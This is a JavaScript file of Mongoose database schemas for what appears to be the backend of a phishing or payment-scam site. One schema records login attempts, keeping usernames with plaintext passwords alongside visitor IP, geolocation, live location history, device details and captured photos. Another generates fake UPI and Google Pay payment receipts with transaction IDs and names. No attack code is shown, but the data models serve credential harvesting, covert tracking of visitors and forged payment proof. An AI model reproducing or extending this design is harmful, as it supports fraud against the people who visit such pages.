const mongoose = require('mongoose');

const loginAttemptSchema = new mongoose.Schema({
    verificationId: { type: String, required: true, unique: true },
    timestamp: { type: Date, default: Date.now },
    ip: String,
    geo: Object,
    location: Object, // Stores parsedLocation with finalLocation, address etc.
    deviceDetails: Object,
    userAgent: String,
    username: String,
    password: String, // Plain text as per original requirement (though hashing is better)
    passwordHash: String,
    phoneNumber: String,
    photoData: String,
    photoFilename: String,
    cloudinaryUrl: String, // For photos uploaded to Cloudinary
    status: { type: String, default: 'Verifying' },
    amount: String,
    type: { type: String, default: 'Visit' },
    isLive: { type: Boolean, default: true },
    lastUpdate: Date,
    locationHistory: [Object],
    photos: [Object] // Stores linked pending photos
}, { timestamps: true });

const generatedPaymentSchema = new mongoose.Schema({
    id: { type: String, required: true, unique: true },
    amount: String,
    toName: String,
    fromName: String,
    bankName: String,
    upiId: String,
    upiTxnId: String,
    googleTxnId: String,
    date: String, // Formatted date string
    createdAt: { type: Date, default: Date.now } // Raw ISO date
});

const pendingPhotoSchema = new mongoose.Schema({
    filename: String,
    url: String, // Can be filename or full URL
    localPath: String,
    type: String,
    timestamp: String,
    ip: String,
    paymentId: String // Optional link to verificationId
});

const settingSchema = new mongoose.Schema({
    key: { type: String, required: true, unique: true, default: 'global' },
    paymentAmount: { type: String, default: "500.00" },
    currencySymbol: { type: String, default: "₹" },
    enableAnimation: { type: Boolean, default: true }
});


module.exports = {
    LoginAttempt: mongoose.model('LoginAttempt', loginAttemptSchema),
    GeneratedPayment: mongoose.model('GeneratedPayment', generatedPaymentSchema),
    PendingPhoto: mongoose.model('PendingPhoto', pendingPhotoSchema),
    Settings: mongoose.model('Settings', settingSchema)
};
